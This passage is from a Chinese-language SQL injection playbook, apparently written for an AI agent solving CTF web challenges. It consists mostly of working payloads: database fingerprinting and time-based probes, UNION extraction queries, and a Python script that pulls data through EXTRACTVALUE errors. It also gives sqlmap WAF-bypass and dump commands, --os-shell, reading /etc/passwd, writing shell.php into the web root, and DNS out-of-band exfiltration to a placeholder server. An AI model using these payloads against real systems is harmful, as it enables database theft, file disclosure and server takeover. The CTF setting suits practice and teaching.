Mid('admin',1,1)   -- 子串（位置从 1 开始）
LEN('1234')         -- 长度
ASC('A')/CHR(65)   -- ASCII 互转
IIF(1=1,'a','b')   -- 条件判断
TOP N / LAST()     -- 行选择
```

---

## 五、数据库识别速查

```sql
-- MSSQL:      @@CONNECTIONS=@@CONNECTIONS / BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
-- Oracle:     ROWNUM=ROWNUM / RAWTOHEX('AB')=RAWTOHEX('AB')
-- PostgreSQL: 5::int=5 / current_database()=current_database()
-- MS Access:  val(cvar(1))=1 / IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0

-- 时间盲注识别
-- MSSQL:      ' WAITFOR DELAY '0:0:5'--
-- Oracle:     ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
-- PostgreSQL: ' OR pg_sleep(5)--
```


---

## REF: union-and-error

# UNION 注入与报错注入深度指南

## UNION 列数精确判断（ORDER BY 二分法 — 必须完成！）

**用 ORDER BY 二分法精确确定列数。必须找到确切的 N，使 ORDER BY N 成功且 ORDER BY N+1 失败：**
```
' ORDER BY 1--    → 正常
' ORDER BY 10--   → 错误  → 列数在 1-9 之间
' ORDER BY 5--    → 正常  → 列数在 5-9 之间
' ORDER BY 8--    → 正常  → 列数在 8-9 之间
' ORDER BY 9--    → 正常  → 列数在 9-9 之间
' ORDER BY 10--   → 错误  → 列数 = 9（确认！）
```

**⚠️ 关键规则：ORDER BY N 成功 ≠ 列数就是 N！**
- ORDER BY 5 成功只说明列数 ≥ 5，可能是 5, 6, 7, 8, 9...
- **必须继续测试直到找到 ORDER BY N+1 失败的边界**
- 找到确切列数后才能构造 UNION

**构造 UNION：**`' UNION SELECT 1,2,3,4,5,6,7,8,9-- `（用确切列数）

**如果 UNION 报错：**
- 不要立刻放弃！先检查列数是否正确
- 如果 ORDER BY N 成功但 UNION SELECT 1,...,N 报错，尝试 N+1、N+2（ORDER BY 对部分查询可能不准）
- 尝试不同注释符：`--`、`#`、`-- -`
- 尝试 NULL 代替数字：`UNION SELECT NULL,NULL,...`
- **必须尝试到 ORDER BY 上界之前不要放弃 UNION**

**找回显位**：观察页面上哪个数字显示了（如显示 2 和 3），这些位置可以放查询语句。

## UNION SELECT 手工提取（首选方案！）

**UNION SELECT 没有字符数限制，应当作为第一选择！仅在 UNION 确实不可用时才用 EXTRACTVALUE。**

```sql
-- 数据库名 + 用户（将查询放在回显位，如位置 2）
' UNION SELECT 1,database(),user(),4,5,6,7,8,9--

-- 所有表名
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9 FROM information_schema.tables WHERE table_schema=database()--

-- 指定表的列名
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_name='flag'--

-- 提取数据（完整 flag，无截断！）
' UNION SELECT 1,flag,3,4,5,6,7,8,9 FROM flag--
```

### CTF 常见 flag 表名速查

枚举表名后，优先检查以下常见命名：
- `flag`, `flags`, `secret`, `secrets`
- `admin`, `users`, `ctf`, `challenge`
- `fl4g`, `s3cret`, `key`, `config`

**为什么 UNION 优先？**
- 返回完整数据，无 32 字符截断
- 一次查询拿到完整 flag
- 不需要 SUBSTRING 分段 + 手动拼接（拼接容易丢字符）

## 报错注入截断陷阱（EXTRACTVALUE / UPDATEXML — 仅当 UNION 不可用时使用！）

**再次强调：UNION SELECT 是首选。EXTRACTVALUE 容易丢字符，仅在 UNION 确实失败后使用。**

EXTRACTVALUE() 和 UPDATEXML() 输出上限 32 字符。`CONCAT(0x7e, data)` 中 `~` 占 1 字符，有效数据只有 31 字符。

**⚠️ 绝对不要手动拼接 EXTRACTVALUE 分段！LLM 数hex字符极易出错。必须用 Python 脚本自动提取+拼接+验证：**

```python
# 用 bash 运行此 Python 脚本自动提取完整 flag
# 只需修改 URL、POST参数、注入点位置
import requests, re, sys

URL = "http://TARGET/send.php"  # ← 修改目标URL
# ← 修改POST参数，注入点用 {PAYLOAD} 占位
def make_data(payload):
    return {
        'fullname': f"1' AND {payload}-- ",  # ← 注入参数
        'email': 'a@b.com', 'phone': '1',
        'subject': 't', 'message': 't', 'submit': '1'
    }

def extract(payload):
    r = requests.post(URL, data=make_data(payload))
    m = re.search(r"XPATH syntax error: '~([^']*)'", r.text)
    return m.group(1) if m else None

# 1) 获取长度
total_len = int(extract("EXTRACTVALUE(1,CONCAT(0x7e,LENGTH((SELECT flag FROM flag))))"))
print(f"Flag length: {total_len}")

# 2) 分段提取 (每段30字符，安全不超32限制)
CHUNK = 30
flag = ""
for start in range(1, total_len + 1, CHUNK):
    part = extract(f"EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT flag FROM flag),{start},{CHUNK})))")
    if not part:
        print(f"ERROR: Segment at {start} returned None!")
        sys.exit(1)
    print(f"  Segment [{start}:{start+len(part)-1}] = '{part}' (len={len(part)})")
    flag += part

# 3) 验证
print(f"\nAssembled flag ({len(flag)} chars): {flag}")
if len(flag) != total_len:
    print(f"ERROR: Length mismatch! Expected {total_len}, got {len(flag)}")
    sys.exit(1)
if not flag.endswith('}'):
    print("ERROR: Flag doesn't end with }")
    sys.exit(1)
print(f"VERIFIED OK: {flag}")
```

**使用方式**：复制上面的 Python 脚本，修改 URL 和参数后直接执行。Python 会自动分段、拼接、验证长度。绝不手动拼接！


---

## REF: waf-bypass-sqlmap

# WAF 绕过与 sqlmap 高级用法

## ⛔ sqlmap 超时控制（必须遵守！）

sqlmap 扫描可能运行很长时间。**必须使用 timeout 包裹，最长 10 分钟**：

```bash
# ✅ 正确：用 timeout + tee 保留输出
timeout 480 sqlmap -u 'http://目标/page.php?id=1' --batch --random-agent --level 2 --risk 2 2>&1 | tee /tmp/sqlmap_output.log

# 超时后立即检查已有结果（可能已找到注入点）
echo "=== sqlmap 结果 ===" && tail -80 /tmp/sqlmap_output.log
```

- ⛔ **禁止**不加 timeout 直接运行 sqlmap
- ⛔ **禁止**用 `sleep N && tail` 轮询等待 sqlmap —— 这会浪费宝贵的轮次时间
- ✅ 超时后**必须** `tail` 查看输出，因为可能已经发现注入点
- ✅ 如果 sqlmap 10 分钟内无结果，切换手动注入测试

## sqlmap 自动化检测

调用 sqlmap（将目标 URL 替换为实际地址）:
```bash
timeout 480 sqlmap -u 'http://目标/page.php?id=1' --batch --random-agent --level 2 --risk 2 --technique BEUSTQ 2>&1 | tee /tmp/sqlmap_output.log
```
如遇 WAF，逐步升级:
```bash
timeout 480 sqlmap -u 'http://目标/page.php?id=1' --batch --tamper=space2comment,between --random-agent 2>&1 | tee /tmp/sqlmap_output.log
```

## WAF 绕过技巧

常用 tamper 脚本组合:
- 通用: `space2comment,between,randomcase`
- MySQL: `space2comment,equaltolike,greatest,halfversionedmorekeywords`
- MSSQL: `space2comment,between,charencode`

编码绕过: URL双编码、Unicode编码、十六进制编码

使用 aboutsecurity 字典库获取绕过 payload:
```bash
ls /pentest/AboutSecurity/Dic/SQL-Inj/
cat /pentest/AboutSecurity/Dic/SQL-Inj/bypass-waf.txt
```

## 手动 SQLi WAF 绕过 Payload

### 空格替代
```sql
UNION%09SELECT   -- Tab
UNION%0aSELECT   -- 换行
UNION/**/SELECT   -- 注释
UNION(SELECT 1,2,3)   -- 括号
```

### 函数替代
```sql
SUBSTRING → MID / SUBSTR / LEFT / RIGHT
CONCAT → CONCAT_WS / GROUP_CONCAT
IF → CASE WHEN ... THEN ... ELSE ... END
SLEEP → BENCHMARK(10000000, SHA1('a'))
```

### 编码函数
```sql
CHAR(65,66,67) 替代 'ABC'
0x414243 替代 'ABC'  -- 十六进制
```

## sqlmap 数据提取流程

1. 库名: `sqlmap --dbs`
2. 表名: `sqlmap -D dbname --tables`
3. 列名: `sqlmap -D dbname -T tablename --columns`
4. 数据: `sqlmap -D dbname -T tablename --dump`
5. 敏感信息: 关注 users/admin/password/config 等表

## 高级利用

- OS Shell: `sqlmap --os-shell`（需 FILE 权限 + 可写路径）
- 文件读取: `sqlmap --file-read=/etc/passwd`
- 文件写入: `sqlmap --file-write=shell.php --file-dest=/var/www/html/`
- DNS 带外: `sqlmap --dns-domain=your.dns.server`

## 注意事项
- 优先使用低风险技术（布尔盲注 > 时间盲注 > 报错注入）
- 避免使用 --risk 3（OR-based 可能修改数据）
- 大量数据提取使用 --threads 控制速率
- 保留原始请求和响应作为证据
